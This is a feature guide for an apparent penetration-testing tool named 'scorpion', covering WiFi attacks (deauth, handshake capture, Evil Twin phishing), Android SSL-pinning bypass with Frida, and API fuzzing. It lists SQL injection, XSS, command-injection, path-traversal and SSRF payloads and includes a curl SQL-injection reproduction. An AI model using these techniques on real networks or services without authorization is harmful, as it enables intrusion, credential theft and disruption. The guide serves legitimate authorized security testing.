# Advanced Features Guide 🎯

**WiFi, Mobile, and Fuzzing capabilities**

---

## 📡 WiFi Penetration Testing

### Quick Start

```bash
# Scan WiFi networks (Linux only, requires root)
sudo scorpion wifi-scan --interface wlan0 --duration 30

# Capture WPA handshake
sudo scorpion wifi-attack "NetworkName" AA:BB:CC:DD:EE:FF --type handshake

# Deauth attack
sudo scorpion wifi-attack "NetworkName" AA:BB:CC:DD:EE:FF --type deauth --count 10
```

### Requirements

- **Linux only** (monitor mode required)
- **Root/sudo access**
- **Tools:** `aircrack-ng`, `reaver`, `hostapd`
- **Hardware:** WiFi adapter with monitor mode support (Alfa, TP-Link TL-WN722N v1)

### Installation

```bash
sudo apt-get install aircrack-ng reaver hostapd dnsmasq bluez
```

### Features

- Network scanning (all channels)
- Monitor mode management
- WPA/WPA2/WPA3 handshake capture
- Deauthentication attacks
- Evil Twin AP (credential phishing)
- WPS cracking
- Bluetooth scanning

### Legal Warning

⚠️ **Only test networks you own or have written permission to test. Unauthorized WiFi testing is illegal.**

---

## 📱 Mobile App Security

### Quick Start

```bash
# Analyze Android APK
scorpion mobile-analyze app.apk --owasp --output report.json

# Bypass SSL pinning (requires Frida)
scorpion mobile-intercept com.example.app --proxy 127.0.0.1:8080
```

### Requirements

- **Tools:** `apktool`, `jadx`, `aapt`
- **Optional:** `frida`, `frida-tools` (for SSL pinning bypass)

### Installation

```bash
# APK analysis tools
sudo apt-get install apktool aapt

# jadx (Java decompiler)
wget https://github.com/skylot/jadx/releases/latest/download/jadx-linux.zip
unzip jadx-linux.zip -d jadx
sudo mv jadx /opt/
sudo ln -s /opt/jadx/bin/jadx /usr/local/bin/

# Frida (optional)
pip install frida-tools
```

### Features

- **APK Static Analysis** - Decompile and analyze Android apps
- **OWASP Mobile Top 10** - M1, M3, M5, M6, M8, M9, M10
- **Hardcoded Secrets** - Find API keys, passwords, AWS credentials
- **Dangerous Permissions** - SMS, Camera, Location, etc.
- **SSL Pinning Bypass** - Intercept HTTPS with Frida
- **Dynamic Analysis** - Runtime hooking

### OWASP Mobile Top 10 Coverage

- **M1:** Improper Credential Usage (hardcoded secrets)
- **M3:** Insecure Authentication
- **M5:** Insecure Communication (cleartext traffic)
- **M6:** Inadequate Privacy Controls (permissions)
- **M8:** Security Misconfiguration (debuggable, backup)
- **M9:** Insecure Data Storage (world-readable files)
- **M10:** Insufficient Cryptography

### Frida Setup (SSL Pinning Bypass)

```bash
# 1. Install Frida server on Android device
FRIDA_VERSION=$(frida --version)
wget https://github.com/frida/frida/releases/download/${FRIDA_VERSION}/frida-server-${FRIDA_VERSION}-android-arm64.xz
unxz frida-server-*.xz
adb push frida-server /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server"

# 2. Run Frida server (requires root)
adb shell "su -c '/data/local/tmp/frida-server &'"

# 3. Use mobile-intercept command
scorpion mobile-intercept com.example.app --proxy 127.0.0.1:8080
```

---

## 🎯 Fuzzing Framework

### Quick Start

```bash
# Fuzz HTTP protocol
scorpion fuzz-protocol 192.168.1.100 80 --protocol http --iterations 1000

# Fuzz REST API
scorpion fuzz-api https://api.example.com /login --method POST --iterations 500
```

### Requirements

- **Python 3.10+** (no external deps for basic fuzzing)
- **Optional:** `AFL++` (binary fuzzing), `requests` (API fuzzing)

### Features

- **Protocol Fuzzing** - TCP/UDP/HTTP
- **API Fuzzing** - 20+ injection payloads (SQL, XSS, Command Injection, XXE, SSRF)
- **File Format Fuzzing** - Seed-based mutation
- **Binary Fuzzing** - AFL++ integration
- **5 Mutation Strategies** - Bit flip, byte flip, insert, delete, interesting values
- **Crash Analysis** - Exploitability assessment (High/Medium/Low)

### Attack Payloads

**SQL Injection:**
- `' OR '1'='1`
- `1' OR '1'='1' --`
- `admin'--`
- `' UNION SELECT NULL--`

**XSS:**
- `<script>alert(1)</script>`
- `<img src=x onerror=alert(1)>`

**Command Injection:**
- `; whoami`
- `| id`
- `` `ls` ``

**Path Traversal:**
- `../../../etc/passwd`
- `..\..\..\windows\win.ini`

**SSRF:**
- `http://localhost:22`
- `http://169.254.169.254/latest/meta-data/`

**Buffer Overflow:**
- `A * 1000`
- `A * 10000`

### Crash Analysis

Fuzzer automatically assesses exploitability:

- **High:** SIGSEGV in writable memory, stack overflow
- **Medium:** Heap corruption, SIGSEGV in read-only memory
- **Low:** NULL pointer dereference, SIGABRT

---

## Example Workflows

### WiFi Security Assessment

```bash
# 1. Scan for networks
sudo scorpion wifi-scan --interface wlan0 --duration 30 --output networks.json

# 2. Target network and capture handshake
sudo scorpion wifi-attack "HomeNetwork" AA:BB:CC:DD:EE:FF \
  --type handshake \
  --output handshake.cap

# 3. Crack password (if GPU cracking module available)
scorpion crack-hash handshake.cap \
  --wordlist /usr/share/wordlists/rockyou.txt \
  --type wpa
```

### Mobile App Security Audit

```bash
# 1. Static analysis
scorpion mobile-analyze target-app.apk --owasp --output report.json

# 2. Review findings
cat report.json | jq '.findings[] | select(.severity == "CRITICAL")'

# 3. Dynamic analysis with SSL pinning bypass
adb shell "su -c '/data/local/tmp/frida-server &'"
scorpion mobile-intercept com.target.app --proxy 127.0.0.1:8080

# 4. Test app with Burp Suite intercepting traffic
```

### API Vulnerability Discovery

```bash
# 1. Fuzz authentication endpoint
scorpion fuzz-api https://api.target.com /api/v1/login \
  --method POST \
  --iterations 500 \
  --output login_findings.json

# 2. Review interesting findings
cat login_findings.json | jq '.[] | select(.status_code == 500)'

# 3. Reproduce manually
curl -X POST https://api.target.com/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin\"--", "password": "test"}'
```

---

## Troubleshooting

### WiFi: "Monitor mode not supported"
- Use compatible adapter (Alfa AWUS036ACH, TP-Link TL-WN722N v1)
- Update wireless drivers
- Ensure not already in use by NetworkManager

### Mobile: "apktool not found"
```bash
sudo apt-get install apktool
```

### Fuzzing: No crashes found
- Increase iterations (try 10,000+)
- Use better seed inputs
- Check target is actually running

---

## Legal & Ethical Use

⚠️ **CRITICAL:** Only test systems you own or have explicit written permission to test.

**Illegal Activities:**
- ❌ Neighbor's WiFi without permission
- ❌ Third-party mobile apps without authorization
- ❌ Public APIs without permission
- ❌ Any unauthorized testing

**Legal Activities:**
- ✅ Your own systems
- ✅ Client systems with signed authorization
- ✅ Bug bounty programs (within scope)
- ✅ Lab environments

---

## Resources

### Tools
- **aircrack-ng:** https://aircrack-ng.org/
- **apktool:** https://github.com/iBotPeaches/Apktool
- **jadx:** https://github.com/skylot/jadx
- **Frida:** https://frida.re/
- **AFL++:** https://github.com/AFLplusplus/AFLplusplus

### Learning
- **OSWP:** Offensive Security Wireless Professional
- **OWASP Mobile Top 10:** https://owasp.org/www-project-mobile-top-10/
- **The Fuzzing Book:** https://www.fuzzingbook.org/

---

## Next Steps

- **All Commands:** [COMMANDS.md](COMMANDS.md)
- **Getting Started:** [GETTING_STARTED.md](GETTING_STARTED.md)
- **Documentation Index:** [DOCS_INDEX.md](DOCS_INDEX.md)

---

**Advanced features ready for professional security testing** 🦂✨
